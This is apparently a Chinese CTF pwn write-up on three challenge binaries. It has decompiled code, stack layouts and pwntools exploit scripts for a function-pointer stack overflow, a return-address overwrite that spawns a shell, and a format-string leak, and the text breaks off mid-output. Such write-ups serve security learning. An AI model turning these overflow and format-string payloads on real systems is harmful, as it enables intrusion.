<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h] BYREF</span></span><br><span class="line">  _DWORD v3[<span class="number">10</span>]; <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+58h] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">1</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = sub_8048604;<span class="comment">//sub_8048604是一个函数,这里没写函数括号,说明v3[0]只是存放函数地址,并不调用函数</span></span><br><span class="line">  v3[<span class="number">1</span>] = sub_8048618;</span><br><span class="line">  v3[<span class="number">2</span>] = sub_804862C;</span><br><span class="line">  v3[<span class="number">3</span>] = sub_8048640;</span><br><span class="line">  v3[<span class="number">4</span>] = sub_8048654;</span><br><span class="line">  v3[<span class="number">5</span>] = sub_8048668;</span><br><span class="line">  v3[<span class="number">6</span>] = sub_804867C;</span><br><span class="line">  v3[<span class="number">7</span>] = sub_8048690;</span><br><span class="line">  v3[<span class="number">8</span>] = sub_80486A4;</span><br><span class="line">  v3[<span class="number">9</span>] = sub_80486B8;<span class="comment">//该函数打印了&quot;You just made it. But then you didn&#x27;t!&quot;,看样子是目标函数</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485DD(s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;</span>, sub_8048654);<span class="comment">//将sub_8048654函数的地址打印出来</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the string to be validate&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v2);<span class="comment">//scanf获取输入,存在栈缓冲区溢出,v2可以溢出</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048702(v2[i]) )<span class="comment">//会根据v2[i]来决定会不会修改v5</span></span><br><span class="line">          v5 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v5 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_804874C(v2[i]) )</span><br><span class="line">          v5 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v5 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))v3[--v5])();<span class="comment">//使用函数指针调用函数,显然要通过该函数指针执行sub_80486CC函数</span></span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环中出现过的三个判断函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_8048702</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span> || a1 == <span class="number">45</span> || a1 == <span class="number">43</span> || a1 == <span class="number">46</span>;</span><br><span class="line">    <span class="comment">//a1是小写字母或者阿拉伯数字或者[  -  +  .其中之一就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_804874C</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span>;</span><br><span class="line">    <span class="comment">//a1是小写字母或者阿拉伯数字或者[ 其中之一就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_8048784</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span>;</span><br><span class="line">     <span class="comment">//a1是小写字母就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="main栈帧"><a href="#main栈帧" class="headerlink" title="main栈帧"></a>main栈帧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-00000074 v2              db 32 dup(?)</span><br><span class="line">-00000054 v3              db 40 dup(?)</span><br><span class="line">-0000002C s               db 32 dup(?)            ; string(C)</span><br><span class="line">-0000000C v5              dd ?</span><br><span class="line">-00000008 i               dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>

<p>v2在栈底,其上的所有东西都可以溢出</p>
<p>v3就是函数指针那一伙子数组</p>
<p>在<code>((void (*)(void))v3[--v5])();</code>这里,v5会经过前面的一系列循环判断被修改.</p>
<p>我们的想法是,将<code>0x80486CC</code>溢出到<code>v3[0]</code>这么一个固定地址,方便最后的<code>((void (*)(void))v3[--v5])();</code>执行它</p>
<p>那么还需要保证v5一开始为1(这个程序一开始设定好了)并且后来一直不被改变.</p>
<p>但是有个规律是,只有循环中三个判断函数返回true时v5才会被修改,如果判断函数都返回false则显然v5不会被修改.</p>
<p>又这三个判断函数只会对 a1是小写字母或者阿拉伯数字或者[  -  +  .这几种情况返回true,那么如果能够将<code>v2[i]</code>溢出成除了这些字符之外的字符就可以绕过判断,保证v5&#x3D;1,如此最终出循环的时候,<code>((void (*)(void))v3[--v5])();</code>就相当于<code>((void (*)(void))v3[0])();</code>,执行固定的函数</p>
<p>现在问题转化为如何保证v2数组满足上述条件,显然v2就是我们要输入的,这个自然可以满足,输入32个问号?或者32个大写字母均可</p>
<p>还要解决的是溢出<code>v3[0]</code>的问题</p>
<p><code>v3[0]</code>是一个四字32位,并且v3紧挨着v2,显然当v2写满了,紧接着就溢出v3了</p>
<p>因此exp可以这样写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>).encode()+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>或者,反正v5总是落在1到10范围内,最后<code>((void (*)(void))v3[--v5])();</code>反正是执行的v3函数指针数组的其中一项,那么直接把v3数组的每一项都溢出成<code>0x80486CC</code>,这样就不用关心v5的值是多少了,也就是不用绕过判断函数了</p>
<p>因此exp还可以这样写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;?&#x27;</span>*<span class="number">32</span>).encode()+p32(<span class="number">0x080486cc</span>)*<span class="number">10</span>  <span class="comment">#由于不用关心v5,因此v2数组也不用关心了</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>最终得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn/forgot]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Opening connection to <span class="number">111.200</span><span class="number">.241</span><span class="number">.244</span> on port <span class="number">51086</span>: Done</span><br><span class="line">/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn/forgot/exp.py:<span class="number">23</span>: BytesWarning: Text <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">bytes</span>; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">I should give you a pointer perhaps. Here: <span class="number">8048654</span></span><br><span class="line"></span><br><span class="line">Enter the string to be validate</span><br><span class="line">&gt; cyberpeace&#123;4edfc4922cff2900b97255284e605051&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>



<h3 id="错误想法"><a href="#错误想法" class="headerlink" title="错误想法"></a>错误想法</h3><h4 id="错误1"><a href="#错误1" class="headerlink" title="错误1"></a>错误1</h4><p>在循环伊始</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = i;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<p>首先用<code>v0=i</code>然后让v0和<code>strlen(v2)</code>作比较,如果v0很大则直接跳过循环</p>
<p>我一开始想用溢出v0跳过循环保持v5&#x3D;1不变</p>
<p>由于<code>v0=i</code>因此我想让i溢出成很大的值然后v0获得其拷贝也是个大数</p>
<p>于是得到了这样的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(&#x27;a&#x27;*32).encode()+p32(0x080486cc)+(&#x27;a&#x27;*0x48).encode()+p32(0x7fffffff)</span><br></pre></td></tr></table></figure>

<p>前32个字符随便写填满v2,反正不会进入循环</p>
<p>然后v3的第一个四字溢出成<code>0x80486cc</code>这个函数地址</p>
<p>然后<code>[ebp-0x50,ebp-0x8)</code>这78个字符都随便溢出,</p>
<p>然后i溢出成最大正数<code>0x7fffffff</code></p>
<p>结果这样打不通</p>
<p>原因是,<code> for ( i = 0; ; ++i )</code>在循环一开始 的时候有一个<code>i=0</code>这个是在代码段里的,这打死也改不了</p>
<p>也就是在执行到这里的时候,我们的payload变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(&#x27;a&#x27;*32).encode()+p32(0x080486cc)+(&#x27;a&#x27;*0x48).encode()+p32(0x0)</span><br></pre></td></tr></table></figure>

<p>i改了也白改,因为v2获取输入发生在循环之前,进入循环的时候又要i&#x3D;0初始化循环变量</p>
<h4 id="错误2"><a href="#错误2" class="headerlink" title="错误2"></a>错误2</h4><p>那么此时把前32个字符改成’A’企图用老方法绕过每次判断函数还可以吗?也不行</p>
<p>因为<code>(&#39;a&#39;*0x48)</code>这里我们已经把v5溢出成<code>a</code>(ascii码为97)了,最后出了循环的时候执行的是<code>((void (*)(void))v3[96])();</code>显然这对于v3指针数组来说已经访问越界了</p>
<h4 id="错误3"><a href="#错误3" class="headerlink" title="错误3"></a>错误3</h4><p>直接不管main函数的所有逻辑,溢出main的返回地址,改成<code>0x80486cc</code>可以吗</p>
<p>即payload这样写:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>).encode()+p32(<span class="number">0x80486CC</span>)</span><br></pre></td></tr></table></figure>

<p>前面<code>0x78</code>个字节啥也不管全都乱写,最后返回地址r溢出成<code>0x80486CC</code></p>
<p>这样写也不行,因为中间将<code>v3</code>那个指针数组溢出毁了,所有的指针都指向<code>0x97</code>这个位置,而这个位置显然不在程序的虚拟地址空间里面(本程序的虚拟地址空间从<code>0x08048000</code>开始).这个位置指的是谁呢?我反正不知道,也不想知道.反正发生了段错误.还没等到main函数返回时程序就因为段错误结束运行了</p>
<h2 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619233350713.png" alt="image-20220619233350713"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\reactor&gt; checksec reactor      [*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\reactor\\reactor&#x27;</span>           Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>



<p>有一个shell函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是没有调用者,需要溢出主函数的返回地址,改成shell的地址<code>4005F6</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">512</span>]; <span class="comment">// [rsp+40h] [rbp-200h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please closing the reaction kettle\n&quot;</span>, <span class="number">0x23</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, easy);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  gets(v5);<span class="comment">//此处存在栈缓冲区溢出攻击</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main函数栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000200 v5              db 512 dup(?)</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>

<p>前512+8&#x3D;520个字节随便溢出</p>
<p>后面八个字节溢出成shell函数的地址<code>0x4005F6</code></p>
<p>属实有点儿弱智了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./reactor&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">520</span>*<span class="string">&#x27;a&#x27;</span>).encode()+p64(<span class="number">0x4005f6</span>);</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/reactor]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./reactor&#x27;</span>: pid 44                                                                                                                                    </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">kali</span><br></pre></td></tr></table></figure>

<p><code>cyberpeace&#123;a6053fab9ffe26d2ddc53ce7f78e08be&#125;</code></p>
<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/realtime]</span><br><span class="line">└─$ checksec realtime</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/realtime/realtime&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>



<p>主函数只调用了一共<code>locker</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">locker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [esp+0h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  imagemagic(s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">35795746</span> )<span class="comment">//如果key=3579576=0x2223322,看来需要溢出改变</span></span><br><span class="line">    result = system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键函数在<code>  imagemagic(s);</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">imagemagic</span><span class="params">(<span class="type">char</span> *format)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在<code>printf</code>格式化字符串漏洞,<code>format</code>来自<code>locker</code>中的<code>s,s</code>来自<code>stdin</code>键盘输入,长度<code>512</code>个字节,足够写入负载了</p>
<p>首先要确定<code>printf</code>时,格式化字符串参数在栈上什么地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./realtime&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&quot;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/realtime]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./realtime&#x27;</span>: pid 77                                                                                                                                   </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./realtime&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 77)</span><br><span 